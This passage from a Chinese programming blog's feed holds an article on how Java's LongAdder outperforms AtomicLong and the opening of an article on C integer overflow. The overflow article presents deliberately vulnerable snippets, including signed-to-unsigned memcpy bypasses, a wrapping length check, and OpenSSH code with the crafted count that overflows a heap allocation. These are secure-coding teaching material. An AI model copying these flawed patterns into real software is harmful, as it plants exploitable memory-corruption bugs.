<p>芝兰生于空谷，不以无人而不芳！君子修身养道，不以穷困而改志！</p>
<p>谢谢听我唠叨。</p>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2014-04-12T16:28:01+08:00</pubDate>
<guid>https://coolshell.cn/articles/11432.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 从LongAdder看更高效的无锁实现 ]]></title>
<link>https://coolshell.cn/articles/11454.html</link>
<content><![CDATA[ 
<p><strong>（感谢 <a href="https://weibo.com/liuinsect" target="_blank">@jd刘锟洋</a> 投稿，更多文章参看他的博客：<a href="http://www.liuinsect.com/" target="_blank">码梦为生</a>）</strong></p>
<p><strong>原文链接</strong>：《<a href="http://www.liuinsect.com/2014/04/15/%E6%AF%94atomiclong%E8%BF%98%E9%AB%98%E6%95%88%E7%9A%84longadder-%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/" target="_blank">比AtomicLong还高效的LongAdder 源码解析</a>》</p>
<p>接触到AtomicLong的原因是在看guava的LoadingCache相关代码时，关于LoadingCache，其实思路也非常简单清晰：用模板模式解决了缓存不命中时获取数据的逻辑，这个思路我早前也正好在项目中使用到。</p>
<p>言归正传，为什么说LongAdder引起了我的注意，原因有二：</p>
<ol>
<li>作者是Doug lea ，地位实在举足轻重。</li>
<li>他说这个比AtomicLong高效。</li>
</ol>
<p>我们知道，AtomicLong已经是非常好的解决方案了，涉及并发的地方都是使用CAS操作，在硬件层次上去做 compare and set操作。效率非常高。</p>
<p>因此，我决定研究下，为什么LongAdder比AtomicLong高效。</p>
<p>首先，看LongAdder的继承树：</p>
<p><img alt="image placeholder" ></p>
<p>继承自Striped64，这个类包装了一些很重要的内部类和操作。稍候会看到。</p>
<p><span id="more-11454"></span></p>
<p><strong>正式开始前，强调下，我们知道，AtomicLong的实现方式是内部有个value 变量，当多线程并发自增，自减时，均通过CAS 指令从机器指令级别操作保证并发的原子性。</strong></p>
<p>再看看LongAdder的方法：</p>
<p><img alt="image placeholder" ><br>
怪不得可以和AtomicLong作比较，连API都这么像。我们随便挑一个API入手分析，这个API通了，其他API都大同小异，因此，我选择了add这个方法。事实上,其他API也都依赖这个方法。</p>
<p><img alt="image placeholder" ><br>
LongAdder中包含了一个Cell 数组，Cell是Striped64的一个内部类，顾名思义，Cell 代表了一个最小单元，这个单元有什么用，稍候会说道。先看定义：</p>
<p><img alt="image placeholder" ><br>
Cell内部有一个非常重要的value变量，并且提供了一个CAS更新其值的方法。</p>
<p>回到add方法：</p>
<p><img alt="image placeholder" ></p>
<p>这里，我有个疑问，AtomicLong已经使用CAS指令，非常高效了（比起各种锁），LongAdder如果还是用CAS指令更新值，怎么可能比AtomicLong高效了？ 何况内部还这么多判断！！！</p>
<p>这是我开始时最大的疑问，所以，我猜想，难道有比CAS指令更高效的方式出现了？ 带着这个疑问，继续。</p>
<p>第一if 判断，第一次调用的时候cells数组肯定为null,因此，进入casBase方法：</p>
<p><img alt="image placeholder" ><br>
原子更新base没啥好说的，如果更新成功，本地调用开始返回，否则进入分支内部。</p>
<p>什么时候会更新失败？ 没错，并发的时候，好戏开始了，AtomicLong的处理方式是死循环尝试更新，直到成功才返回，而LongAdder则是进入这个分支。</p>
<p>分支内部，通过一个Threadlocal变量threadHashCode 获取一个HashCode对象，该HashCode对象依然是Striped64类的内部类，看定义：</p>
<p><img alt="image placeholder" ><br>
有个code变量，保存了一个非0的随机数随机值。</p>
<p>回到add方法：</p>
<p><img alt="image placeholder" ></p>
<p>拿到该线程相关的HashCode对象后，获取它的code变量，as[(n-1)&amp;h] 这句话相当于对h取模，只不过比起取模，因为是 与 的运算所以效率更高。</p>
<p>计算出一个在Cells 数组中当先线程的HashCode对应的 索引位置，并将该位置的Cell 对象拿出来用CAS更新它的value值。</p>
<p>当然，如果as 为null 并且更新失败，才会进入retryUpdate方法。</p>
<p>看到这里我想应该有很多人明白为什么LongAdder会比AtomicLong更高效了，没错，唯一会制约AtomicLong高效的原因是高并发，高并发意味着CAS的失败几率更高， 重试次数更多，越多线程重试，CAS失败几率又越高，变成恶性循环，AtomicLong效率降低。 那怎么解决？<strong> LongAdder给了我们一个非常容易想到的解决方案：减少并发，将单一value的更新压力分担到多个value中去，降低单个value的 “热度”，分段更新！！！</strong></p>
<p>这样，线程数再多也会分担到多个value上去更新，只需要增加value就可以降低 value的 “热度”  AtomicLong中的 恶性循环不就解决了吗？ cells 就是这个 “段” cell中的value 就是存放更新值的， 这样，<strong>当我需要总数时，把cells 中的value都累加一下不就可以了么！！</strong></p>
<p><strong>当然，聪明之处远远不仅仅这里，在看看add方法中的代码，casBase方法可不可以不要，直接分段更新,上来就计算 索引位置，然后更新value？</strong></p>
<p>答案是不好，不是不行，因为，casBase操作等价于AtomicLong中的CAS操作，要知道，LongAdder这样的处理方式是有坏处的，分段操作必然带来空间上的浪费，可以空间换时间，但是，<strong>能不换就不换，看空间时间都节约~！</strong> 所以，<strong>casBase操作保证了在低并发时，不会立即进入分支做分段更新操作</strong>，因为低并发时，casBase操作基本都会成功，只有并发高到一定程度了，才会进入分支，所以，Doug Lea对该类的说明是：<strong> 低并发时LongAdder和AtomicLong性能差不多，高并发时LongAdder更高效！</strong></p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p>但是，Doung Lea 还是没这么简单，聪明之处还没有结束……</p>
<p>如此，retryUpdate中做了什么事，也基本略知一二了，因为cell中的value都更新失败(说明该索引到这个cell的线程也很多，并发也很高时) 或者cells数组为空时才会调用retryUpdate,</p>
<p>因此，<strong>retryUpdate里面应该会做两件事：</strong></p>
<ol>
<li>
<strong>扩容，将cells数组扩大</strong>，降低每个cell的并发量，同样，这也意味着cells数组的rehash动作。</li>
<li> <strong>给空的cells变量赋一个新的Cell数组</strong>。</li>
</ol>
<p>是不是这样呢？ 继续看代码：</p>
<p>代码比较长，变成文本看看，为了方便大家看if else 分支，对应的  { } 我用相同的颜色标注出来。可以看到，这个时候Doug Lea才愿意使用死循环保证更新成功~！</p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">  final void retryUpdate(long x, HashCode hc, boolean wasUncontended) {
        int h = hc.code;
        boolean collide = false;                // True if last slot nonempty
        for (;;) {
            Cell[] as; Cell a; int n; long v;
            if ((as = cells) != null &amp;&amp; (n = as.length) &gt; 0) {// 分支1
                if ((a = as[(n - 1) &amp; h]) == null) {
                    if (busy == 0) {            // Try to attach new Cell
                        Cell r = new Cell(x);   // Optimistically create
                        if (busy == 0 &amp;&amp; casBusy()) {
                            boolean created = false;
                            try {               // Recheck under lock
                                Cell[] rs; int m, j;
                                if ((rs = cells) != null &amp;&amp;
                                        (m = rs.length) &gt; 0 &amp;&amp;
                                        rs[j = (m - 1) &amp; h] == null) {
                                    rs[j] = r;
                                    created = true;
                                }
                            } finally {
                                busy = 0;
                            }
                            if (created)
                                break;
                            continue;           // Slot is now non-empty
                        }
                    }
                    collide = false;
                }
                else if (!wasUncontended)       // CAS already known to fail
                    wasUncontended = true;      // Continue after rehash
                else if (a.cas(v = a.value, fn(v, x)))
                    break;
                else if (n &gt;= NCPU || cells != as)
                    collide = false;            // At max size or stale
                else if (!collide)
                    collide = true;
                else if (busy == 0 &amp;&amp; casBusy()) {
                    try {
                        if (cells == as) {      // Expand table unless stale
                            Cell[] rs = new Cell[n &lt;&lt; 1];
                            for (int i = 0; i &lt; n; ++i)
                                rs[i] = as[i];
                            cells = rs;
                        }
                    } finally {
                        busy = 0;
                    }
                    collide = false;
                    continue;                   // Retry with expanded table
                }
                h ^= h &lt;&lt; 13;                   // Rehash  h ^= h &gt;&gt;&gt; 17;
                h ^= h &lt;&lt; 5;
            }
            else if (busy == 0 &amp;&amp; cells == as &amp;&amp; casBusy()) {//分支2
                boolean init = false;
                try {                           // Initialize table
                    if (cells == as) {
                        Cell[] rs = new Cell[2];
                        rs[h &amp; 1] = new Cell(x);
                        cells = rs;
                        init = true;
                    }
                } finally {
                    busy = 0;
                }
                if (init)
                    break;
            }
            else if (casBase(v = base, fn(v, x)))
                break;                          // Fall back on using base
        }
        hc.code = h;                            // Record index for next time
    }

</pre>
<p>分支2中，为cells为空的情况，需要new 一个Cell数组。</p>
<p>分支1分支中，略复杂一点点：</p>
<p>注意，几个分支中都提到了busy这个方法，这个可以理解为一个CAS实现的锁，只有在需要更新cells数组的时候才会更新该值为1，如果更新失败，则说明当前有线程在更新cells数组，当前线程需要等待。重试。</p>
<p>回到分支1中，这里首先判断当前cells数组中的索引位置的cell元素是否为空，如果为空，则添加一个cell到数组中。</p>
<p>否则更新 标示冲突的标志位wasUncontended 为 true ，重试。</p>
<p>否则，再次更新cell中的value,如果失败，重试。</p>
<p>。。。。。。。一系列的判断后<span style="line-height: 1.5em;">，如果还是失败，下下下策，reHash,直接将cells数组扩容一倍，并更新当前线程的hash值，保证下次更新能尽可能成功。</span></p>
<p><strong>可以看到，LongAdder确实用了很多心思减少并发量，并且，每一步都是在”没有更好的办法“的时候才会选择更大开销的操作，从而尽可能的用最最简单的办法去完成操作。追求简单，但是绝对不粗暴。</strong></p>
<p>———————<strong>陈皓注————————</strong></p>
<p>最后留给大家思考的两个问题：</p>
<p style="padding-left: 30px;">1）是不是AtomicLong可以被废了？</p>
<p style="padding-left: 30px;">2）如果cell被创建后，原来的casBase就不走了，会不会性能更差？</p>
<p>———————liuinsect<strong>注————————</strong></p>
<p>昨天和左耳朵耗子简单讨论了下，发现左耳朵耗子,耗哥对读者思维的引导还是非常不错的，在第一次发现这个类后，对里面的实现又提出了更多的问题，引导大家思考，值得学习。</p>
<p>我们 发现的问题有这么几个（包括以上的问题），自己简单总结下，欢迎大家讨论：</p>
<p>1. jdk 1.7中是不是有这个类？<br>
我确认后，结果如下：    jdk-7u51 版本上还没有  但是jdk-8u20版本上已经有了。代码基本一样 ，增加了对double类型的支持和删除了一些冗余的代码。有兴趣的同学可以去下载下JDK 1.8看看</p>
<p>2. base有没有参与汇总？<br>
base在调用intValue等方法的时候是会汇总的：</p>
<p><a href="http://www.liuinsect.com/wp-content/uploads/2014/04/LA101.bmp"><img alt="image placeholder" ></a></p>
<p>3. 如果cell被创建后，原来的casBase就不走了，会不会性能更差？ base的顺序可不可以调换?<br>
<span style="line-height: 1.5em;">    刚开始我想可不可以调换add方法中的判断顺序，比如，先做casBase的判断？ 仔细思考后认为还是 不调换可能更好，调换后每次都要CAS一下，在高并发时，失败几率非常高，并且是恶性循环，比起一次判断，后者的开销明显小很多，还没有副作用（上一个问题，base变量在sum时base是会被统计的，并不会丢掉base的值）。因此，不调换可能会更好。</span></p>
<p>4. AtomicLong可不可以废掉？<br>
我的想法是可以废掉了，因为，虽然LongAdder在空间上占用略大，但是，它的性能已经足以说明一切了,无论是从节约空的角度还是执行效率上，AtomicLong基本没有优势了，具体看这个测试（感谢<a id="commentauthor-1431785" href="http://lianming.info/" rel="external nofollow">Lemon</a>的回复）:http://blog.palominolabs.com/2014/02/10/java-8-performance-improvements-longadder-vs-atomiclong/</p>
<p style="padding-left: 30px;">
</p>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2014-04-17T23:11:40+08:00</pubDate>
<guid>https://coolshell.cn/articles/11454.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ C语言的整型溢出问题 ]]></title>
<link>https://coolshell.cn/articles/11466.html</link>
<content><![CDATA[ 
<p>整型溢出有点老生常谈了，bla, bla, bla… 但似乎没有引起多少人的重视。整型溢出会有可能导致缓冲区溢出，缓冲区溢出会导致各种黑客攻击，比如最近OpenSSL的heartbleed事件，就是一个buffer overread的事件。在这里写下这篇文章，希望大家都了解一下整型溢出，编译器的行为，以及如何防范，以写出更安全的代码。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA" title="什么是整型溢出">什么是整型溢出</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-2" href="#%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E7%9A%84%E5%8D%B1%E5%AE%B3" title="整型溢出的危害">整型溢出的危害</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-3" href="#%E7%A4%BA%E4%BE%8B%E4%B8%80%EF%BC%9A%E6%95%B4%E5%BD%A2%E6%BA%A2%E5%87%BA%E5%AF%BC%E8%87%B4%E6%AD%BB%E5%BE%AA%E7%8E%AF" title="示例一：整形溢出导致死循环">示例一：整形溢出导致死循环</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-4" href="#%E7%A4%BA%E4%BE%8B%E4%BA%8C%EF%BC%9A%E6%95%B4%E5%BD%A2%E8%BD%AC%E5%9E%8B%E6%97%B6%E7%9A%84%E6%BA%A2%E5%87%BA" title="示例二：整形转型时的溢出">示例二：整形转型时的溢出</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-5" href="#%E7%A4%BA%E4%BE%8B%E4%B8%89%EF%BC%9A%E5%88%86%E9%85%8D%E5%86%85%E5%AD%98" title="示例三：分配内存">示例三：分配内存</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-6" href="#%E7%A4%BA%E4%BE%8B%E5%9B%9B%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%AF%BC%E8%87%B4%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98" title="示例四：缓冲区溢出导致安全问题">示例四：缓冲区溢出导致安全问题</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-7" href="#%E7%A4%BA%E4%BE%8B%E4%BA%94%EF%BC%9Asize_t_%E7%9A%84%E6%BA%A2%E5%87%BA" title="示例五：size_t 的溢出">示例五：size_t 的溢出</a></li>
</ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-8" href="#%E5%85%B3%E4%BA%8E%E7%BC%96%E8%AF%91%E5%99%A8%E7%9A%84%E8%A1%8C%E4%B8%BA" title="关于编译器的行为">关于编译器的行为</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-9" href="#%E7%BC%96%E8%AF%91%E5%99%A8%E4%BC%98%E5%8C%96" title="编译器优化">编译器优化</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-10" href="#%E8%8A%B1%E7%B5%AE%EF%BC%9A%E7%BC%96%E8%AF%91%E5%99%A8%E7%9A%84%E5%BD%A9%E8%9B%8B" title="花絮：编译器的彩蛋">花絮：编译器的彩蛋</a></li>
</ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-11" href="#%E6%AD%A3%E7%A1%AE%E6%A3%80%E6%B5%8B%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA" title="正确检测整型溢出">正确检测整型溢出</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-12" href="#%E4%BA%8C%E5%88%86%E5%8F%96%E4%B8%AD%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E4%B8%AD%E7%9A%84%E6%BA%A2%E5%87%BA" title="二分取中搜索算法中的溢出">二分取中搜索算法中的溢出</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-13" href="#%E4%B8%8A%E6%BA%A2%E5%87%BA%E5%92%8C%E4%B8%8B%E6%BA%A2%E5%87%BA%E7%9A%84%E6%A3%80%E6%9F%A5" title="上溢出和下溢出的检查">上溢出和下溢出的检查</a></li>
</ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-14" href="#%E5%85%B6%E5%AE%83" title="其它">其它</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E4%BB%80%E4%B9%88%E6%98%AF%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA"></span>什么是整型溢出<span class="ez-toc-section-end"></span>
</h4>
<p>C语言的整型问题相信大家并不陌生了。对于整型溢出，分为无符号整型溢出和有符号整型溢出。</p>
<p><strong>对于unsigned整型溢出，C的规范是有定义的</strong>——“溢出后的数会以2^(8*sizeof(type))作模运算”，也就是说，如果一个unsigned char（1字符，8bits）溢出了，会把溢出的值与256求模。例如：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="c">unsigned char x = 0xff;
printf("%d\n", ++x);</pre>
<p>上面的代码会输出：0 （因为0xff + 1是256，与2^8求模后就是0）</p>
<p><strong>对于signed整型的溢出，C的规范定义是“undefined behavior”</strong>，也就是说，编译器爱怎么实现就怎么实现。对于大多数编译器来说，算得啥就是啥。比如：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="c">signed char x =0x7f; //注：0xff就是-1了，因为最高位是1也就是负数了
printf("%d\n", ++x);</pre>
<p>上面的代码会输出：-128，因为0x7f + 0x01得到0x80，也就是二进制的1000 0000，符号位为1，负数，后面为全0，就是负的最小数，即-128。</p>
<p><span id="more-11466"></span></p>
<p>另外，千万别以为signed整型溢出就是负数，这个是不定的。比如：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="c">signed char x = 0x7f;
signed char y = 0x05;
signed char r = x * y;
printf("%d\n", r);</pre>
<p>上面的代码会输出：123</p>
<p>相信对于这些大家不会陌生了。</p>
<h4>
<span class="ez-toc-section" id="%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E7%9A%84%E5%8D%B1%E5%AE%B3"></span>整型溢出的危害<span class="ez-toc-section-end"></span>
</h4>
<p>下面说一下，整型溢出的危害。</p>
<h5>
<span class="ez-toc-section" id="%E7%A4%BA%E4%BE%8B%E4%B8%80%EF%BC%9A%E6%95%B4%E5%BD%A2%E6%BA%A2%E5%87%BA%E5%AF%BC%E8%87%B4%E6%AD%BB%E5%BE%AA%E7%8E%AF"></span>示例一：整形溢出导致死循环<span class="ez-toc-section-end"></span>
</h5>
<pre class="EnlighterJSRAW" data-enlighter-language="c"> ... ...
... ...
short len = 0;
... ...
while(len&lt; MAX_LEN) {
    len += readFromInput(fd, buf);
    buf += len;
}</pre>
<p>上面这段代码可能是很多程序员都喜欢写的代码（我在很多代码里看到过多次），其中的MAX_LEN 可能会是个比较大的整型，比如32767，我们知道short是16bits，取值范围是-32768 到 32767 之间。但是，上面的while循环代码有可能会造成整型溢出，而len又是个有符号的整型，所以可能会成负数，导致不断地死循环。</p>
<h5>
<span class="ez-toc-section" id="%E7%A4%BA%E4%BE%8B%E4%BA%8C%EF%BC%9A%E6%95%B4%E5%BD%A2%E8%BD%AC%E5%9E%8B%E6%97%B6%E7%9A%84%E6%BA%A2%E5%87%BA"></span>示例二：整形转型时的溢出<span class="ez-toc-section-end"></span>
</h5>
<pre class="EnlighterJSRAW" data-enlighter-language="c">int copy_something(char *buf, int len)
{
    #define MAX_LEN 256
    char mybuf[MAX_LEN];
     ... ...
     ... ...

     if(len &gt; MAX_LEN){ // &lt;---- [1]
         return -1;
     }

     return memcpy(mybuf, buf, len);
}</pre>
<p>上面这个例子中，还是[1]处的if语句，看上去没有会问题，但是len是个signed int，而memcpy则需一个size_t的len，也就是一个unsigned 类型。于是，len会被提升为unsigned，此时，如果我们给len传一个负数，会通过了if的检查，但在memcpy里会被提升为一个正数，于是我们的mybuf就是overflow了。这个会导致mybuf缓冲区后面的数据被重写。</p>
<h5>
<span class="ez-toc-section" id="%E7%A4%BA%E4%BE%8B%E4%B8%89%EF%BC%9A%E5%88%86%E9%85%8D%E5%86%85%E5%AD%98"></span>示例三：分配内存<span class="ez-toc-section-end"></span>
</h5>
<p>关于整数溢出导致堆溢出的很典型的例子是，OpenSSH Challenge-Response SKEY/BSD_AUTH 远程缓冲区溢出漏洞。下面这段有问题的代码摘自OpenSSH的代码中的auth2-chall.c中的input_userauth_info_response() 函数:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="c">nresp = packet_get_int();
if (nresp &gt; 0) {
    response = xmalloc(nresp*sizeof(char*));
    for (i = 0; i &lt; nresp; i++)
        response[i] = packet_get_string(NULL);
}</pre>
<p>上面这个代码中，nresp是size_t类型（size_t一般就是unsigned int/long int），这个示例是一个解数据包的示例，一般来说，数据包中都会有一个len，然后后面是data。如果我们精心准备一个len，比如：1073741825（在32位系统上，指针占4个字节，unsigned int的最大值是0xffffffff，我们只要提供0xffffffff/4 的值——0x40000000，这里我们设置了0x4000000 + 1）， nresp就会读到这个值，然后nresp<em>sizeof(char</em>)就成了 1073741825 * 4，于是溢出，结果成为了 0x100000004，然后求模，得到4。于是，malloc(4)，于是后面的for循环1073741825 次，就可以干环事了（经过0x40000001的循环,用户的数据早已覆盖了xmalloc原先分配的4字节的空间以及后面的数据，包括程序代码，函数指针，于是就可以改写程序逻辑。关于更多的东西，你可以看一下这篇文章《<a href="http://engj.org/index.php/ej/article/view/112/167" target="_blank" rel="noopener noreferrer">Survey of Protections from Buffer-Overflow Attacks</a>》）。</p>
<h5>
<span class="ez-toc-section" id="%E7%A4%BA%E4%BE%8B%E5%9B%9B%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%AF%BC%E8%87%B4%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"></span>示例四：缓冲区溢出导致安全问题<span class="ez-toc-section-end"></span>
</h5>
<pre class="EnlighterJSRAW" data-enlighter-language="c">int func(char *buf1, unsigned int len1,
         char *buf2, unsigned int len2 )
{
   char mybuf[256]; 

   if((len1 + len2) &gt; 256){    //&lt;--- [1]
       return -1;
   } 

   memcpy(mybuf, buf1, len1);
   memcpy(mybuf + len1, buf2, len2); 

   do_some_stuff(mybuf); 

   return 0;
}</pre>
<p>上面这个例子本来是想把buf1和buf2的内容copy到mybuf里，其中怕len1 + len2超过256 还做了判断，但是，如果len1+len2溢出了，根据unsigned的特性，其会与2^32求模，所以，基本上来说，上面代码中的[1]处有可能为假的。（注：通常来说，在这种情况下，如果你开启-O代码优化选项，那个if语句块就全部被和谐掉了——被编译器给删除了）比如，你可以测试一下 len1=0x104， len2 = 0xfffffffc 的情况。</p>
<h5>
<span class="ez-toc-section" id="%E7%A4%BA%E4%BE%8B%E4%BA%94%EF%BC%9Asize_t_%E7%9A%84%E6%BA%A2%E5%87%BA"></span>示例五：size_t 的溢出<span class="ez-toc-section-end"></span>
</h5>
<pre class="EnlighterJSRAW" data-enlighter-language="c">for (int i= strlen(s)-1;  i&gt;=0; i--)  { ... }</pre>
<pre class="EnlighterJSRAW" data-enlighter-language="c">for (int i=v.size()-1; i&gt;=0; i--)  { ... }</pre>
<p>上面这两个示例是我们经常用的从尾部遍历一个数组的for循环。第一个是字符串，第二个是C++中的vector容器。strlen()和vector::size()返回的都是 size_t，size_t在32位系统下就是一个unsigned int。你想想，如果strlen(s)和v.size() 都是0呢？这个循环会成为个什么情况？于是strlen(s) – 1 和 v.size() – 1 都不会成为 -1，而是成为了 (unsigned int)(-1)，一个正的最大数。导致你的程序越界访问。</p>
<p>这样的例子有很多很多，这些整型溢出的问题如果在关键的地方，尤其是在搭配有用户输入的地方，如果被黑客利用了，就会导致很严重的安全问题。</p>
<h4>
<span class="ez-toc-section" id="%E5%85%B3%E4%BA%8E%E7%BC%96%E8%AF%91%E5%99%A8%E7%9A%84%E8%A1%8C%E4%B8%BA"></span>关于编译器的行为<span class="ez-toc-section-end"></span>
</h4>
<p>在谈一下如何正确的检查整型溢出之前，我们还要来学习一下编译器的一些东西。请别怪我罗嗦。</p>
<h5>
<span class="ez-toc-section" id="%E7%BC%96%E8%AF%91%E5%99%A8%E4%BC%98%E5%8C%96"></span>编译器优化<span class="ez-toc-section-end"></span>
</h5>
<p>如何检查整型溢出或是整型变量是否合法有时候是一件很麻烦的事情，就像上面的第四个例子一样，编译的优化参数-O/-O2/-O3基本上会假设你的程序不会有整形溢出。会把你的代码中检查溢出的代码给优化掉。</p>
<p>关于编译器的优化，在这里再举个例子，假设我们有下面的代码（又是一个相当相当常见的代码）：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="c">int len;
char* data;

if (data + len &lt; data){
    printf("invalid len\n");
    exit(-1);
}
</pre>
<p>上面这段代码中，len 和 data 配套使用，我们害怕len的值是非法的，或是len溢出了，于是我们写下了if语句来检查。这段代码在-O的参数下正常。但是在-O2的编译选项下，整个if语句块被优化掉了。</p>
<p>你可以写个小程序，在gcc下编译（我的版本是4.4.7，记得加上-O2和-g参数），然后用gdb调试时，用disass /m命信输出汇编，你会看到下面的结果（你可以看到整个if语句块没有任何的汇编代码——直接被编译器和谐掉了）：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">7 int len = 10;
8 char* data = (char *)malloc(len);
0x00000000004004d4 &lt;+4&gt;: mov $0xa,%edi
0x00000000004004d9 &lt;+9&gt;: callq 0x4003b8 &lt;<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="274a464b4b484467574b53">[email protected]</a>&gt;

9
10 if (data + len &lt; data){
11 printf("invalid len\n");
12 exit(-1);
13 }
14
15 }
0x00000000004004de &lt;+14&gt;: add $0x8,%rsp
0x00000000004004e2 &lt;+18&gt;: retq
</pre>
<p>对此，你需要把上面 char* 转型成 uintptr_t 或是 size_t，说白了也就是把char*转成unsigned的数据结构，if语句块就无法被优化了。如下所示：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="c">if ((uintptr_t)data + len &lt; (uintptr_t)data){
    ... ...
}</pre>
<p>关于这个事，你可以看一下C99的规范说明《 <a href="http://www.open-std.org/JTC1/SC22/WG14/www/docs/n1124.pdf" target="_blank" rel="noopener noreferrer">ISO/IEC 9899:1999 C specification</a> 》第 §6.5.6 页，第8点，我截个图如下：（这段话的意思是定义了指针+/-一个整型的行为，如果越界了，则行为是undefined）</p>
<p><img alt="image placeholder" ></p>
<p>注意上面标红线的地方，说如果指针指在数组范围内没事，如果越界了就是undefined，也就是说这事交给编译器实现了，编译器想咋干咋干，那怕你想把其优化掉也可以。在这里要重点说一下，<strong>C语言中的一个大恶魔—— Undefined! 这里都是“野兽出没”的地方，你一定要小心小心再小心</strong>。</p>
<h5>
<span class="ez-toc-section" id="%E8%8A%B1%E7%B5%AE%EF%BC%9A%E7%BC%96%E8%AF%91%E5%99%A8%E7%9A%84%E5%BD%A9%E8%9B%8B"></span>花絮：编译器的彩蛋<span class="ez-toc-section-end"></span>
</h5>
<p>上面说了所谓的undefined行为就全权交给编译器实现，gcc在1.17版本下对于undefined的行为还玩了个彩蛋（<a href="https://en.wikipedia.org/wiki/Undefined_behavior#Compiler_easter_eggs" target="_blank" rel="noopener noreferrer">参看Wikipedia</a>）。</p>
<p>下面gcc 1.17版本下的遭遇undefined行为时，gcc在unix发行版下玩的彩蛋的源代码。我们可以看到，它会去尝试去执行一些游戏<a href="https://en.wikipedia.org/wiki/NetHack">NetHack</a>， <a href="https://en.wikipedia.org/wiki/Rogue_%28computer_game%29">Rogue</a> 或是Emacs的 <a href="https://en.wikipedia.org/wiki/Tower_of_Hanoi#Applications">Towers of Hanoi</a>，如果找不到，就输出一条NB的报错。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="c">execl("/usr/games/hack", "#pragma", 0); // try to run the game NetHack
execl("/usr/games/rogue", "#pragma", 0); // try to run the game Rogue
// try to run the Tower's of Hanoi simulation in Emacs.
execl("/usr/new/emacs", "-f","hanoi","9","-kill",0);
execl("/usr/local/emacs","-f","hanoi","9","-kill",0); // same as above
fatal("You are in a maze of twisty compiler features, all different");</pre>
<h4>
<span class="ez-toc-section" id="%E6%AD%A3%E7%A1%AE%E6%A3%80%E6%B5%8B%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA"></span>正确检测整型溢出<span class="ez-toc-section-end"></span>
</h4>
<p>在看过编译器的这些行为后，你应该会明白——“<strong>在整型溢出之前，一定要做检查，不然，就太晚了</strong>”。</p>
<p>我们来看一段代码：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="c"> void foo(int m, int n)
{
    size_t s = m + n;
    .......
}</pre>
<p>上面这段代码有两个风险：<strong>1）有符号转无符号</strong>，<strong>2）整型溢出</strong>。这两个情况在前面的那些示例中你都应该看到了。<strong>所以，你千万不要把任何检查的代码写在 s = m + n 这条语名后面，不然就太晚了</strong>。undefined行为就会出现了——用句纯正的英文表达就是——“Dragon is here”——你什么也控制不住了。（注意：有些初学者也许会以为size_t是无符号的，而根据优先级 m 和 n 会被提升到unsigned int。其实不是这样的，m 和 n 还是signed int，m + n 的结果也是signed int，然后再把这个结果转成unsigned int 赋值给s）</p>
<p>比如，下面的代码是错的：</p>
